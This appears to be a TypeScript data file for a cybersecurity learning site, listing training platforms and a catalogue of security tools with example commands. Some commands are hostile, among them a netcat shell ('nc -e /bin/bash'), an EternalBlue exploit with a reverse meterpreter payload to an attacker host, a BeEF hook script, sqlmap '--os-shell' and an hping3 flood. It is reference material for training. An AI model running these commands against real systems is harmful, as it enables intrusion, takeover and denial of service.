/* ============================================================
   cyberTools.ts — Unified CyberSecurity Hub Data Layer
   Contains: CyberTool[] + Platform[] + all helper configs
   ============================================================ */

// ─────────────────────────────────────────────
// INTERFACES
// ─────────────────────────────────────────────

export interface CyberTool {
  category:
    | "Networking"
    | "OSINT"
    | "Web Security"
    | "Password Attacks"
    | "Wireless Security"
    | "Exploitation"
    | "Forensics"
    | "Reverse Engineering"
    | "Social Engineering"
    | "Vulnerability Scanning";
  name: string;
  slug: string;
  level: "Beginner" | "Intermediate" | "Advanced";
  use: string;
  description?: string;
  commands: string[];
  tags?: string[];
}

export interface Platform {
  name: string;
  category: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced" | "All Levels";
  description: string;
  link: string;
  features: string[];
  pricing: "Free" | "Freemium" | "Paid";
  skillsGained: string[];
  bestFor: string;
}

// ─────────────────────────────────────────────
// STYLE CONFIGS
// ─────────────────────────────────────────────

export const levelConfig = {
  Beginner: {
    color: "text-emerald-400",
    bg: "bg-emerald-500/10",
    border: "border-emerald-400/30",
    shadow: "shadow-emerald-500/20",
    glow: "shadow-emerald-500/40",
    icon: "🟢",
    gradient: "from-emerald-500/20 to-green-500/10",
  },
  Intermediate: {
    color: "text-amber-400",
    bg: "bg-amber-500/10",
    border: "border-amber-400/30",
    shadow: "shadow-amber-500/20",
    glow: "shadow-amber-500/40",
    icon: "🟡",
    gradient: "from-amber-500/20 to-yellow-500/10",
  },
  Advanced: {
    color: "text-rose-400",
    bg: "bg-rose-500/10",
    border: "border-rose-400/30",
    shadow: "shadow-rose-500/20",
    glow: "shadow-rose-500/40",
    icon: "🔴",
    gradient: "from-rose-500/20 to-red-500/10",
  },
} as const;

export const difficultyColors = {
  Beginner: {
    bg: "bg-emerald-500/10",
    text: "text-emerald-300",
    border: "border-emerald-400/30",
  },
  Intermediate: {
    bg: "bg-amber-500/10",
    text: "text-amber-300",
    border: "border-amber-400/30",
  },
  Advanced: {
    bg: "bg-rose-500/10",
    text: "text-rose-300",
    border: "border-rose-400/30",
  },
  "All Levels": {
    bg: "bg-violet-500/10",
    text: "text-violet-300",
    border: "border-violet-400/30",
  },
} as const;

export const pricingColors = {
  Free: {
    bg: "bg-emerald-500/10",
    text: "text-emerald-300",
    border: "border-emerald-400/30",
  },
  Freemium: {
    bg: "bg-blue-500/10",
    text: "text-blue-300",
    border: "border-blue-400/30",
  },
  Paid: {
    bg: "bg-orange-500/10",
    text: "text-orange-300",
    border: "border-orange-400/30",
  },
} as const;

// ─────────────────────────────────────────────
// PLATFORMS DATA
// ─────────────────────────────────────────────

export const platforms: Platform[] = [
  // ===============================
  // CYBERSECURITY & HACKING LABS
  // ===============================
  {
    name: "TryHackMe",
    category: "Cybersecurity Labs",
    difficulty: "Beginner",
    description:
      "Interactive learning platform with guided hands-on labs for Linux, networking, web hacking, and cybersecurity fundamentals through structured learning paths.",
    link: "https://tryhackme.com",
    features: ["Guided Learning Paths", "Virtual Machines", "Certificates", "Active Community"],
    pricing: "Freemium",
    skillsGained: ["Web Security", "Network Security", "Linux Administration", "OSINT"],
    bestFor: "Beginners starting their cybersecurity journey"
  },
  {
    name: "Hack The Box",
    category: "Cybersecurity Labs",
    difficulty: "Advanced",
    description:
      "Professional-grade penetration testing platform with realistic vulnerable machines, Active Directory labs, and certification tracks used by security professionals worldwide.",
    link: "https://www.hackthebox.com",
    features: ["Realistic Labs", "AD Environments", "Pro Labs", "Certifications (CPTS)"],
    pricing: "Freemium",
    skillsGained: ["Penetration Testing", "Active Directory", "Privilege Escalation", "Post-Exploitation"],
    bestFor: "Intermediate to advanced professionals preparing for OSCP/real-world pentesting"
  },
  {
    name: "PortSwigger Web Security Academy",
    category: "Web Security",
    difficulty: "All Levels",
    description:
      "Free comprehensive interactive labs focused on web application vulnerabilities including SQL injection, XSS, CSRF, and advanced exploitation techniques.",
    link: "https://portswigger.net/web-security",
    features: ["Free Access", "Video Tutorials", "Practice Labs", "Burp Suite Integration"],
    pricing: "Free",
    skillsGained: ["SQL Injection", "XSS", "CSRF", "Authentication Bypass", "SSRF"],
    bestFor: "Anyone wanting to master web application security and Burp Suite"
  },
  {
    name: "OverTheWire",
    category: "Linux & Cryptography",
    difficulty: "Beginner",
    description:
      "Classic wargames platform offering Linux command-line challenges and cryptography puzzles designed to build fundamental security skills progressively.",
    link: "https://overthewire.org",
    features: ["SSH-based Games", "Progressive Difficulty", "Community Solutions", "Classic CTF Style"],
    pricing: "Free",
    skillsGained: ["Linux Command Line", "Bash Scripting", "Privilege Escalation", "Basic Cryptography"],
    bestFor: "Beginners learning Linux fundamentals and command-line security"
  },
  {
    name: "PicoCTF",
    category: "CTF Platform",
    difficulty: "Beginner",
    description:
      "Beginner-friendly Capture The Flag platform focusing on cryptography, forensics, reverse engineering, and binary exploitation in a gamified environment.",
    link: "https://picoctf.org",
    features: ["Year-round Access", "Educational Content", "Hints System", "Leaderboards"],
    pricing: "Free",
    skillsGained: ["Cryptography", "Forensics", "Reverse Engineering", "Binary Exploitation"],
    bestFor: "Students and beginners learning CTF fundamentals"
  },

  // ===============================
  // PRACTICE & CTF PLATFORMS
  // ===============================
  {
    name: "CTFtime",
    category: "CTF Competitions",
    difficulty: "All Levels",
    description:
      "Global directory and calendar of Capture The Flag competitions with team rankings, writeups, and event information for competitive cybersecurity challenges.",
    link: "https://ctftime.org",
    features: ["Event Calendar", "Team Rankings", "Writeup Archive", "Global Competitions"],
    pricing: "Free",
    skillsGained: ["Competitive CTF", "Team Collaboration", "Time Management", "Diverse Security Domains"],
    bestFor: "Competitive players and teams tracking global CTF events"
  },
  {
    name: "Root-Me",
    category: "Security Challenges",
    difficulty: "Intermediate",
    description:
      "Comprehensive security challenge platform offering over 400 challenges across web security, cryptography, reverse engineering, networking, and forensics.",
    link: "https://www.root-me.org",
    features: ["400+ Challenges", "Multi-language Support", "Ranking System", "Virtual Environments"],
    pricing: "Free",
    skillsGained: ["Web Exploitation", "Cryptanalysis", "Network Security", "Reverse Engineering"],
    bestFor: "Intermediate learners wanting diverse security challenges"
  },
  {
    name: "VulnHub",
    category: "Vulnerable Machines",
    difficulty: "Intermediate",
    description:
      "Community-driven repository of downloadable vulnerable virtual machines for offline penetration testing practice in controlled local environments.",
    link: "https://www.vulnhub.com",
    features: ["Offline Practice", "Community VMs", "Varied Difficulty", "Detailed Writeups"],
    pricing: "Free",
    skillsGained: ["Enumeration", "Exploitation", "Post-Exploitation", "Report Writing"],
    bestFor: "Practitioners wanting offline hands-on pentesting practice"
  },

  // ===============================
  // LINUX PRACTICE
  // ===============================
  {
    name: "Linux Journey",
    category: "Linux Learning",
    difficulty: "Beginner",
    description:
      "Structured interactive learning platform covering Linux fundamentals, system administration, networking, and essential command-line tools for beginners.",
    link: "https://linuxjourney.com",
    features: ["Interactive Lessons", "Structured Curriculum", "Quiz System", "Command Reference"],
    pricing: "Free",
    skillsGained: ["Linux Basics", "File System", "Process Management", "Networking Fundamentals"],
    bestFor: "Complete beginners learning Linux from scratch"
  },
  {
    name: "Bandit (OverTheWire)",
    category: "Linux Practice",
    difficulty: "Beginner",
    description:
      "Progressive Linux security challenges focused on command-line proficiency, file manipulation, privilege escalation, and basic security concepts.",
    link: "https://overthewire.org/wargames/bandit",
    features: ["33 Levels", "SSH Access", "Community Help", "Well-documented"],
    pricing: "Free",
    skillsGained: ["Command Line", "File Permissions", "SSH", "Basic Security Concepts"],
    bestFor: "Beginners building Linux command-line confidence"
  },

  // ===============================
  // CRYPTOGRAPHY PRACTICE
  // ===============================
  {
    name: "CryptoHack",
    category: "Cryptography",
    difficulty: "Intermediate",
    description:
      "Modern cryptography learning platform with interactive challenges covering symmetric encryption (AES), asymmetric crypto (RSA), hashing, and mathematical foundations.",
    link: "https://cryptohack.org",
    features: ["Python-based", "Progressive Learning", "Mathematics Focus", "Blockchain Crypto"],
    pricing: "Free",
    skillsGained: ["AES", "RSA", "Elliptic Curves", "Hash Functions", "Crypto Attacks"],
    bestFor: "Developers and security enthusiasts learning practical cryptography"
  },
  {
    name: "Cryptopals",
    category: "Cryptography",
    difficulty: "Advanced",
    description:
      "Renowned cryptography challenge sets designed by security experts to teach practical attacks on real-world crypto systems through implementation and breaking.",
    link: "https://cryptopals.com",
    features: ["8 Challenge Sets", "Implementation Focus", "Real-world Attacks", "No Hints"],
    pricing: "Free",
    skillsGained: ["Crypto Implementation", "Attack Techniques", "Protocol Weaknesses", "Side Channels"],
    bestFor: "Advanced practitioners mastering cryptographic attack techniques"
  },

  // ===============================
  // BLOCKCHAIN & WEB3 LABS
  // ===============================
  {
    name: "Ethernaut",
    category: "Blockchain Security",
    difficulty: "Intermediate",
    description:
      "Smart contract security wargame focused on Ethereum vulnerabilities including reentrancy, integer overflow, delegate calls, and Solidity-specific issues.",
    link: "https://ethernaut.openzeppelin.com",
    features: ["Browser-based", "Solidity Focus", "MetaMask Integration", "Progressive Difficulty"],
    pricing: "Free",
    skillsGained: ["Smart Contract Security", "Solidity", "Ethereum", "DApp Interaction"],
    bestFor: "Web3 developers and security researchers learning smart contract hacking"
  },
  {
    name: "Damn Vulnerable DeFi",
    category: "DeFi Security",
    difficulty: "Advanced",
    description:
      "Advanced DeFi security challenges covering flash loans, price oracle manipulation, governance attacks, and complex protocol vulnerabilities in decentralized finance.",
    link: "https://www.damnvulnerabledefi.xyz",
    features: ["DeFi Protocols", "Flash Loan Attacks", "Price Oracles", "Real-world Scenarios"],
    pricing: "Free",
    skillsGained: ["DeFi Security", "Flash Loans", "Oracle Manipulation", "MEV Attacks"],
    bestFor: "Advanced blockchain security professionals specializing in DeFi"
  },
  {
    name: "Web3 Security Academy",
    category: "Blockchain Security",
    difficulty: "Advanced",
    description:
      "Comprehensive blockchain security learning platform covering smart contract auditing, security best practices, and advanced blockchain attack vectors.",
    link: "https://www.web3securityacademy.com",
    features: ["Audit Training", "Security Patterns", "Case Studies", "Industry Standards"],
    pricing: "Free",
    skillsGained: ["Smart Contract Auditing", "Security Patterns", "Vulnerability Analysis", "Audit Reports"],
    bestFor: "Security professionals transitioning to blockchain security auditing"
  },

  // ===============================
  // PROFESSIONAL TRAINING
  // ===============================
  {
    name: "INE (eLearnSecurity)",
    category: "Professional Labs",
    difficulty: "Advanced",
    description:
      "Professional-grade cybersecurity training platform offering comprehensive red team, blue team, and cloud security labs with industry-recognized certifications.",
    link: "https://ine.com",
    features: ["Professional Certs", "Lab Environments", "Video Training", "Career Paths"],
    pricing: "Paid",
    skillsGained: ["Advanced Pentesting", "Exploit Development", "Cloud Security", "Network Defense"],
    bestFor: "Professionals seeking advanced certifications (eCPPT, eCDFP, eCIR)"
  },
  {
    name: "Cybrary",
    category: "Cybersecurity Learning",
    difficulty: "Beginner",
    description:
      "Online cybersecurity education platform with courses, virtual labs, and practice exams covering foundational to advanced security topics and certifications.",
    link: "https://www.cybrary.it",
    features: ["Video Courses", "Virtual Labs", "Practice Exams", "Career Paths"],
    pricing: "Freemium",
    skillsGained: ["Security Fundamentals", "Compliance", "Threat Detection", "Incident Response"],
    bestFor: "Beginners and professionals preparing for security certifications"
  },
  {
    name: "RangeForce",
    category: "Blue Team Labs",
    difficulty: "Intermediate",
    description:
      "Defensive security training platform focusing on SOC operations, incident response, threat hunting, and blue team skills in realistic enterprise environments.",
    link: "https://www.rangeforce.com",
    features: ["SOC Training", "Incident Response", "Team Exercises", "Threat Hunting"],
    pricing: "Paid",
    skillsGained: ["SOC Operations", "Incident Response", "SIEM", "Threat Detection"],
    bestFor: "Blue team professionals and SOC analysts developing defensive skills"
  },
];

// Category groupings for better organization
export const platformCategories = {
  "Cybersecurity Labs": ["TryHackMe", "Hack The Box"],
  "Web Security": ["PortSwigger Web Security Academy"],
  "Linux & Command Line": ["Linux Journey", "Bandit (OverTheWire)", "OverTheWire"],
  "CTF & Competitions": ["PicoCTF", "CTFtime", "Root-Me", "VulnHub"],
  "Cryptography": ["CryptoHack", "Cryptopals"],
  "Blockchain Security": ["Ethernaut", "Damn Vulnerable DeFi", "Web3 Security Academy"],
  "Professional Training": ["INE (eLearnSecurity)", "Cybrary", "RangeForce"],
};

// ─────────────────────────────────────────────
// CYBER TOOLS DATA
// ─────────────────────────────────────────────

export const cyberTools: CyberTool[] = [
  // NETWORKING
  {
    category: "Networking",
    name: "Nmap",
    slug: "nmap",
    level: "Beginner",
    use: "Network scanning and service discovery",
    description:
      "The industry standard for network discovery and security auditing. Identifies live hosts, open ports, services, and operating systems.",
    commands: [
      "nmap target",
      "nmap -sV target",
      "nmap -A target",
      "nmap -p- target",
      "nmap -sC -sV -O target",
      "nmap --script vuln target",
    ],
    tags: ["Port Scanning", "Service Detection", "OS Fingerprinting"],
  },
  {
    category: "Networking",
    name: "Wireshark",
    slug: "wireshark",
    level: "Beginner",
    use: "Deep packet inspection and network protocol analysis",
    description:
      "World's most popular network protocol analyzer. Captures and interactively analyzes network traffic in real-time.",
    commands: [
      "wireshark",
      "wireshark -k -i eth0",
      "tcp.port == 80",
      "http.request",
      "ip.addr == 192.168.1.1",
    ],
    tags: ["Packet Analysis", "Network Forensics", "Protocol Analysis"],
  },
  {
    category: "Networking",
    name: "Tcpdump",
    slug: "tcpdump",
    level: "Intermediate",
    use: "Command-line packet capture and analysis",
    description:
      "Powerful CLI packet analyzer for capturing and displaying network packets. Essential for troubleshooting and security monitoring.",
    commands: [
      "tcpdump -i eth0",
      "tcpdump -i eth0 port 80",
      "tcpdump -w capture.pcap",
      "tcpdump -r capture.pcap",
      "tcpdump -i eth0 -nn -s0 -v",
      "tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'",
    ],
    tags: ["Packet Capture", "CLI Tool", "Network Monitoring"],
  },
  {
    category: "Networking",
    name: "Netcat",
    slug: "netcat",
    level: "Intermediate",
    use: "Network swiss army knife for debugging and exploitation",
    description:
      "Versatile networking utility for reading/writing data across network connections. Used for port scanning, file transfers, and backdoors.",
    commands: [
      "nc -lvnp 4444",
      "nc target 80",
      "nc -nv target 4444",
      "nc -e /bin/bash target 4444",
      "nc -u target 53",
    ],
    tags: ["Port Scanning", "File Transfer", "Backdoor"],
  },
  {
    category: "Networking",
    name: "Bettercap",
    slug: "bettercap",
    level: "Advanced",
    use: "Network attack and monitoring framework",
    description:
      "Powerful Swiss Army knife for WiFi, Bluetooth, and Ethernet networks reconnaissance and MITM attacks.",
    commands: [
      "bettercap -iface wlan0",
      "net.probe on",
      "arp.spoof on",
      "net.sniff on",
      "set arp.spoof.targets 192.168.1.10",
    ],
    tags: ["MITM", "ARP Spoofing", "Network Attacks"],
  },
  {
    category: "Networking",
    name: "Masscan",
    slug: "masscan",
    level: "Intermediate",
    use: "Ultra-fast port scanner",
    description:
      "Fastest port scanner capable of scanning the entire internet in under 6 minutes. Transmits 10 million packets per second.",
    commands: [
      "masscan -p1-65535 target",
      "masscan 0.0.0.0/0 -p80",
      "masscan -p80,443 --rate=10000 target",
      "masscan --banners -p80 target",
    ],
    tags: ["Mass Scanning", "Speed", "Port Discovery"],
  },
  {
    category: "Networking",
    name: "Hping3",
    slug: "hping3",
    level: "Advanced",
    use: "Custom packet crafting and network testing",
    description:
      "Command-line TCP/IP packet assembler/analyzer for network security testing, firewall testing, and advanced traceroute.",
    commands: [
      "hping3 -S target -p 80",
      "hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood target",
      "hping3 -1 target",
      "hping3 --traceroute -V -1 target",
    ],
    tags: ["Packet Crafting", "DDoS Testing", "Firewall Testing"],
  },
  {
    category: "Networking",
    name: "Ettercap",
    slug: "ettercap",
    level: "Intermediate",
    use: "Comprehensive MITM attack suite",
    description:
      "Suite for man-in-the-middle attacks on LAN. Features sniffing of live connections, content filtering, and protocol dissection.",
    commands: [
      "ettercap -T -M arp:remote /target1/ /target2/",
      "ettercap -G",
      "ettercap -Tq -i eth0 -M arp:remote /192.168.1.1//",
    ],
    tags: ["MITM", "ARP Poisoning", "Session Hijacking"],
  },

  // OSINT
  {
    category: "OSINT",
    name: "theHarvester",
    slug: "theharvester",
    level: "Beginner",
    use: "Gather emails, subdomains, and employee names",
    description:
      "Open source intelligence tool for gathering emails, names, subdomains, IPs, and URLs from multiple public sources.",
    commands: [
      "theHarvester -d example.com -b all",
      "theHarvester -d example.com -b google",
      "theHarvester -d example.com -b bing,linkedin",
      "theHarvester -d example.com -b dnsdumpster",
    ],
    tags: ["Email Harvesting", "Subdomain Enum", "Reconnaissance"],
  },
  {
    category: "OSINT",
    name: "Shodan",
    slug: "shodan",
    level: "Beginner",
    use: "Search engine for internet-connected devices",
    description:
      "The world's first search engine for Internet-connected devices. Find webcams, servers, IoT devices, and industrial systems.",
    commands: [
      "shodan search apache",
      "shodan host <ip>",
      "shodan stats apache",
      "shodan search product:MySQL",
      "shodan search city:'New York' port:22",
    ],
    tags: ["IoT Search", "Vulnerability Discovery", "Asset Discovery"],
  },
  {
    category: "OSINT",
    name: "Sherlock",
    slug: "sherlock",
    level: "Beginner",
    use: "Hunt down social media accounts by username",
    description:
      "Find usernames across over 300 social networks. Useful for investigating online presence and digital footprints.",
    commands: [
      "sherlock username",
      "sherlock username --timeout 60",
      "sherlock username --csv",
      "sherlock username --print-found",
    ],
    tags: ["Username Search", "Social Media", "OSINT"],
  },
  {
    category: "OSINT",
    name: "Maltego",
    slug: "maltego",
    level: "Intermediate",
    use: "Visual link analysis and data mining platform",
    description:
      "Industry-leading OSINT and forensics application for link analysis, visualizing complex relationships between people, companies, and infrastructure.",
    commands: [
      "maltego",
      "Run standard transforms",
      "Analyze graph relationships",
      "Export investigation data",
    ],
    tags: ["Link Analysis", "Data Mining", "Intelligence Gathering"],
  },
  {
    category: "OSINT",
    name: "Google Dorks",
    slug: "google-dorks",
    level: "Beginner",
    use: "Advanced search operators for finding exposed data",
    description:
      "Leverage Google's advanced operators to find exposed files, directories, credentials, admin panels, and sensitive information indexed by search engines.",
    commands: [
      "site:example.com",
      'intitle:"index of"',
      "inurl:admin",
      "filetype:pdf confidential",
      'intext:"username" "password"',
      "ext:sql | ext:db | ext:log",
      "cache:example.com",
      'intitle:"Apache Status" "Apache Server Status"',
      "inurl:wp-admin site:gov",
    ],
    tags: ["Google Hacking", "Information Disclosure", "Passive Recon"],
  },
  {
    category: "OSINT",
    name: "Recon-ng",
    slug: "recon-ng",
    level: "Intermediate",
    use: "Full-featured reconnaissance framework",
    description:
      "Powerful web reconnaissance framework with independent modules, database interaction, and built-in convenience functions.",
    commands: [
      "recon-ng",
      "marketplace search",
      "modules load recon/domains-hosts/google_site_web",
      "options set SOURCE example.com",
      "run",
    ],
    tags: ["Reconnaissance", "Framework", "Automation"],
  },
  {
    category: "OSINT",
    name: "SpiderFoot",
    slug: "spiderfoot",
    level: "Intermediate",
    use: "Automated OSINT reconnaissance tool",
    description:
      "Automates OSINT collection from over 200 data sources. Correlates data to find relationships between domains, IPs, and people.",
    commands: [
      "spiderfoot -l 127.0.0.1:5001",
      "spiderfoot -s target.com",
      "spiderfoot -t IP_ADDRESS -m sfp_shodan",
    ],
    tags: ["Automation", "Intelligence", "Correlation"],
  },
  {
    category: "OSINT",
    name: "Metagoofil",
    slug: "metagoofil",
    level: "Beginner",
    use: "Extract metadata from public documents",
    description:
      "Extracts metadata from public documents (PDF, DOC, XLS, PPT) to identify usernames, software versions, and server information.",
    commands: [
      "metagoofil -d example.com -t pdf,doc -l 100 -o output",
      "metagoofil -d example.com -t all -n 50",
    ],
    tags: ["Metadata", "Document Analysis", "Information Leakage"],
  },

  // WEB SECURITY
  {
    category: "Web Security",
    name: "Burp Suite",
    slug: "burp-suite",
    level: "Beginner",
    use: "Comprehensive web application security testing",
    description:
      "Industry-standard toolkit for web application security testing. Intercept, analyze, and modify HTTP/HTTPS traffic.",
    commands: [
      "burpsuite",
      "Configure proxy → 127.0.0.1:8080",
      "Send request to Repeater",
      "Use Intruder for fuzzing",
      "Scanner for vulnerability detection",
    ],
    tags: ["Proxy", "Web Testing", "Vulnerability Scanner"],
  },
  {
    category: "Web Security",
    name: "OWASP ZAP",
    slug: "owasp-zap",
    level: "Beginner",
    use: "Automated web vulnerability scanner",
    description:
      "Free and open-source web application security scanner. Find vulnerabilities in web applications during development and testing.",
    commands: [
      "zaproxy",
      "zap-cli quick-scan http://target",
      "zap-cli active-scan http://target",
      "zap-cli spider http://target",
    ],
    tags: ["Vulnerability Scanning", "OWASP", "Automation"],
  },
  {
    category: "Web Security",
    name: "SQLmap",
    slug: "sqlmap",
    level: "Intermediate",
    use: "Automatic SQL injection and database takeover",
    description:
      "Automates the process of detecting and exploiting SQL injection flaws. Supports MySQL, Oracle, PostgreSQL, Microsoft SQL Server, and more.",
    commands: [
      'sqlmap -u "http://target?id=1" --dbs',
      'sqlmap -u "http://target?id=1" -D database --tables',
      'sqlmap -u "http://target?id=1" -D database -T table --dump',
      "sqlmap -u 'http://target' --data='user=admin&pass=admin'",
      "sqlmap -u 'http://target' --os-shell",
    ],
    tags: ["SQL Injection", "Database", "Exploitation"],
  },
  {
    category: "Web Security",
    name: "Nikto",
    slug: "nikto",
    level: "Beginner",
    use: "Web server vulnerability scanner",
    description:
      "Performs comprehensive tests against web servers for multiple items including dangerous files, outdated server versions, and server configuration issues.",
    commands: [
      "nikto -h target",
      "nikto -h target -p 80,443",
      "nikto -h target -Tuning 123",
      "nikto -h target -o report.html",
    ],
    tags: ["Web Scanner", "Server Testing", "Configuration Audit"],
  },
  {
    category: "Web Security",
    name: "Dirb",
    slug: "dirb",
    level: "Beginner",
    use: "Web content directory brute-forcing",
    description:
      "Web content scanner that launches dictionary-based attacks against web servers to find hidden directories and files.",
    commands: [
      "dirb http://target",
      "dirb http://target /usr/share/wordlists/dirb/common.txt",
      "dirb http://target -X .php,.html",
    ],
    tags: ["Directory Brute Force", "Content Discovery", "Enumeration"],
  },
  {
    category: "Web Security",
    name: "Gobuster",
    slug: "gobuster",
    level: "Intermediate",
    use: "Fast directory and DNS brute-forcing",
    description:
      "Written in Go, performs brute-forcing of URIs (directories and files), DNS subdomains, and virtual host names.",
    commands: [
      "gobuster dir -u http://target -w wordlist.txt",
      "gobuster dns -d example.com -w wordlist.txt",
      "gobuster vhost -u http://target -w wordlist.txt",
      "gobuster dir -u http://target -w wordlist.txt -x php,html,txt",
    ],
    tags: ["Brute Force", "Speed", "Enumeration"],
  },
  {
    category: "Web Security",
    name: "WPScan",
    slug: "wpscan",
    level: "Beginner",
    use: "WordPress vulnerability scanner",
    description:
      "Black box WordPress security scanner that detects vulnerabilities in WordPress core, plugins, and themes.",
    commands: [
      "wpscan --url http://target",
      "wpscan --url http://target --enumerate u",
      "wpscan --url http://target --enumerate vp,vt",
      "wpscan --url http://target --passwords wordlist.txt",
    ],
    tags: ["WordPress", "CMS Scanner", "Plugin Vulnerabilities"],
  },
  {
    category: "Web Security",
    name: "XSStrike",
    slug: "xsstrike",
    level: "Intermediate",
    use: "Advanced XSS detection and exploitation",
    description:
      "Most advanced XSS detection suite with powerful fuzzing engine and intelligent payload generator.",
    commands: [
      "xsstrike -u 'http://target?param=value'",
      "xsstrike -u 'http://target' --crawl",
      "xsstrike -u 'http://target' --data 'param=value'",
    ],
    tags: ["XSS", "Fuzzing", "Payload Generation"],
  },
  {
    category: "Web Security",
    name: "Commix",
    slug: "commix",
    level: "Advanced",
    use: "Command injection vulnerability detection",
    description:
      "Automated tool for detecting and exploiting command injection vulnerabilities in web applications.",
    commands: [
      "commix --url='http://target?param=value'",
      "commix --url='http://target' --data='param=value'",
      "commix --url='http://target' --cookie='session=abc123'",
    ],
    tags: ["Command Injection", "Exploitation", "Web Attacks"],
  },

  // EXPLOITATION  
  {
    category: "Exploitation",
    name: "Metasploit Framework",
    slug: "metasploit",
    level: "Advanced",
    use: "Comprehensive exploitation and post-exploitation framework",
    description:
      "The world's most used penetration testing framework. Contains thousands of exploits, payloads, and auxiliary modules.",
    commands: [
      "msfconsole",
      "search exploit windows smb",
      "use exploit/windows/smb/ms17_010_eternalblue",
      "set RHOSTS target_ip",
      "set PAYLOAD windows/meterpreter/reverse_tcp",
      "set LHOST attacker_ip",
      "run",
    ],
    tags: ["Exploitation", "Post-Exploitation", "Framework"],
  },
  {
    category: "Exploitation",
    name: "SearchSploit",
    slug: "searchsploit",
    level: "Beginner",
    use: "Offline exploit database search",
    description:
      "Command-line search tool for Exploit-DB. Find exploits for vulnerable software versions instantly.",
    commands: [
      "searchsploit apache",
      "searchsploit -w wordpress",
      "searchsploit -m 12345",
      "searchsploit -p 12345",
    ],
    tags: ["Exploit Database", "Search", "PoC"],
  },
  {
    category: "Exploitation",
    name: "BeEF",
    slug: "beef",
    level: "Advanced",
    use: "Browser exploitation framework",
    description:
      "Focuses on web browser exploitation. Assesses the actual security posture of a target environment via client-side attack vectors.",
    commands: [
      "./beef",
      "Access Web UI: http://127.0.0.1:3000/ui/panel",
      "<script src='http://beef-ip:3000/hook.js'></script>",
    ],
    tags: ["Browser Exploitation", "XSS", "Client-Side"],
  },
  {
    category: "Exploitation",
    name: "Empire",
    slug: "empire",
    level: "Advanced",
    use: "Post-exploitation and C2 framework",
    description:
      "Pure PowerShell post-exploitation agent built on cryptologically-secure communications and flexible architecture.",
    commands: [
      "empire",
      "listeners",
      "uselistener http",
      "execute",
      "agents",
    ],
    tags: ["Post-Exploitation", "C2", "PowerShell"],
  },

  // PASSWORD ATTACKS
  {
    category: "Password Attacks",
    name: "John the Ripper",
    slug: "john-the-ripper",
    level: "Beginner",
    use: "Fast offline password cracking",
    description:
      "Open source password security auditing and recovery tool. Supports hundreds of hash and cipher types.",
    commands: [
      "john hashes.txt",
      "john --show hashes.txt",
      "john --wordlist=rockyou.txt hashes.txt",
      "john --incremental hashes.txt",
      "john --format=md5 hashes.txt",
    ],
    tags: ["Password Cracking", "Hash Cracking", "Offline"],
  },
  {
    category: "Password Attacks",
    name: "Hydra",
    slug: "hydra",
    level: "Intermediate",
    use: "Fast online password brute-forcing",
    description:
      "Parallelized login cracker which supports numerous protocols including SSH, FTP, HTTP, SMB, and databases.",
    commands: [
      "hydra -l user -P pass.txt target ssh",
      "hydra -L users.txt -P pass.txt ftp://target",
      "hydra -l admin -P wordlist.txt target http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
      "hydra -s 22 ssh://target",
    ],
    tags: ["Brute Force", "Online Attacks", "Multi-Protocol"],
  },
  {
    category: "Password Attacks",
    name: "Hashcat",
    slug: "hashcat",
    level: "Advanced",
    use: "World's fastest password recovery tool",
    description:
      "Advanced password recovery using GPU acceleration. Supports 300+ highly-optimized hashing algorithms.",
    commands: [
      "hashcat -m 0 hashes.txt wordlist.txt",
      "hashcat -a 3 hashes.txt ?a?a?a?a?a?a?a?a",
      "hashcat --show hashes.txt",
      "hashcat -m 1000 ntlm.txt rockyou.txt",
      "hashcat -a 0 -m 0 hash.txt wordlist.txt -r rules/best64.rule",
    ],
    tags: ["GPU Cracking", "High Speed", "Hash Recovery"],
  },
  {
    category: "Password Attacks",
    name: "Medusa",
    slug: "medusa",
    level: "Intermediate",
    use: "Speedy parallel password cracker",
    description:
      "Parallel brute-force login cracker supporting many services. Modular design allows for easy addition of new services.",
    commands: [
      "medusa -h target -u admin -P wordlist.txt -M ssh",
      "medusa -H hosts.txt -U users.txt -P pass.txt -M ftp",
      "medusa -h target -U users.txt -P pass.txt -M http -m DIR:/admin",
    ],
    tags: ["Brute Force", "Parallel", "Multi-Service"],
  },
  {
    category: "Password Attacks",
    name: "CeWL",
    slug: "cewl",
    level: "Beginner",
    use: "Custom wordlist generator from websites",
    description:
      "Spiders a given URL to create custom wordlists based on the website content. Useful for targeted password attacks.",
    commands: [
      "cewl http://target -w wordlist.txt",
      "cewl http://target -d 3 -m 5 -w custom.txt",
      "cewl http://target --email -w emails.txt",
    ],
    tags: ["Wordlist Generation", "Web Scraping", "Custom Lists"],
  },
  {
    category: "Password Attacks",
    name: "Crunch",
    slug: "crunch",
    level: "Beginner",
    use: "Wordlist generator tool",
    description:
      "Generates custom wordlists based on criteria you specify. Useful for creating targeted password lists.",
    commands: [
      "crunch 6 8 -o wordlist.txt",
      "crunch 4 4 0123456789 -o pins.txt",
      "crunch 8 8 -t @@@@%%%% -o mixed.txt",
    ],
    tags: ["Wordlist", "Pattern Generation", "Brute Force Prep"],
  },

  // WIRELESS SECURITY
  {
    category: "Wireless Security",
    name: "Aircrack-ng Suite",
    slug: "aircrack-ng",
    level: "Intermediate",
    use: "Complete WiFi security assessment toolkit",
    description:
      "Suite of tools to assess WiFi network security: packet capture, WEP/WPA/WPA2-PSK cracking, and replay attacks.",
    commands: [
      "airmon-ng start wlan0",
      "airodump-ng wlan0mon",
      "airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon",
      "aireplay-ng -0 10 -a BSSID -c CLIENT wlan0mon",
      "aircrack-ng -w wordlist.txt capture.cap",
    ],
    tags: ["WiFi Cracking", "WPA2", "Packet Injection"],
  },
  {
    category: "Wireless Security",
    name: "Reaver",
    slug: "reaver",
    level: "Advanced",
    use: "WPS PIN brute-force attack",
    description:
      "Exploits a flaw in WPS (WiFi Protected Setup) to recover WPA/WPA2 passphrases through brute-forcing the WPS PIN.",
    commands: [
      "reaver -i wlan0mon -b BSSID -vv",
      "reaver -i wlan0mon -b BSSID -c CHANNEL -vv",
      "reaver -i wlan0mon -b BSSID -p PIN -vv",
    ],
    tags: ["WPS Attack", "PIN Brute Force", "WiFi"],
  },
  {
    category: "Wireless Security",
    name: "Wifite",
    slug: "wifite",
    level: "Beginner",
    use: "Automated wireless attack tool",
    description:
      "Automated wireless auditor designed for Linux. Attacks multiple WEP, WPA, and WPS encrypted networks in a row.",
    commands: [
      "wifite",
      "wifite --wpa --dict wordlist.txt",
      "wifite --wps --pixie",
    ],
